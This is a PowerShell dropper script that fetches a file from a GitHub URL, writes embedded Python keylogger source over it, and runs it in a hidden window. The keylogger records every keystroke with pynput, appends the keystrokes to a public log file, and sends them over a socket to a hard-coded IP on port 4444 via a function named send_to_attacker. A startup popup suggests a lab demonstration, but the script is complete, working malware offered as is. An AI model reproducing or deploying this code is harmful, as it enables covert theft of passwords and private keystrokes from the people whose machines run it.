# === SETUP ===
$downloadUrl = "https://raw.githubusercontent.com/ndnik/ndnik/main/keylogger.py"
$tempPath = "$env:TEMP\keylogger.py"

# === DOWNLOAD keylogger.py ===
Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing
Write-Host "`n✅ Downloaded to: $tempPath"

# === POPUP ENABLED CODE to overwrite ===
$popupCode = @'
import ctypes
import pynput.keyboard
import socket
import threading
import os

# Popup confirmation (so you know it's running)
ctypes.windll.user32.MessageBoxW(0, "✅ Keylogger Started!", "Logger", 0)

IP = "192.168.159.134"
PORT = 4444
log = ""

def send_to_attacker(message):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))
        s.send(message.encode())
        s.close()
    except:
        pass

def process_key(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += f" [{key}] "
    if len(log) >= 10:
        with open("C:\\Users\\Public\\log.txt", "a") as f:
            f.write(log + "\\n")
        send_to_attacker(log)
        log = ""

def start_logger():
    with pynput.keyboard.Listener(on_press=process_key) as listener:
        listener.join()

threading.Thread(target=start_logger).start()
'@

# === OVERWRITE with Popup-Injected version ===
$popupCode | Out-File -FilePath $tempPath -Encoding ASCII
Write-Host "✅ Injected popup into: $tempPath"

# === AUTO-RUN via Python Launcher ===
Start-Process -WindowStyle Hidden -FilePath "python" -ArgumentList "`"$tempPath`""
Write-Host "✅ Auto-executed keylogger"

